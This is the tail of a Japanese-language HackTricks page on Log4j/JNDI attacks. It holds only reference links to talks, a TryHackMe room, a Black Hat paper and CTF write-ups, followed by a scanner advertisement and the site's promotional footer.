* [https://www.youtube.com/watch?v=XG14EstTgQ4](https://www.youtube.com/watch?v=XG14EstTgQ4)
* [https://tryhackme.com/room/solar](https://tryhackme.com/room/solar)
* [https://www.youtube.com/watch?v=Y8a5nB-vy78](https://www.youtube.com/watch?v=Y8a5nB-vy78)
* [https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)
* [https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/)
* [https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/](https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/)

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

最も重要な脆弱性を見つけて修正するために。Intruderは攻撃対象を追跡し、積極的な脅威スキャンを実行し、APIからWebアプリ、クラウドシステムまで、技術スタック全体で問題を見つけます。[**無料でお試しください**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ HackTricksで**会社を宣伝**したいですか？または、**最新バージョンのPEASSを入手**したり、HackTricksをPDFでダウンロードしたりしたいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです
* [**公式のPEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**をフォロー**してください。
* **ハッキングのトリックを共有するには、**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出**してください。

</details>
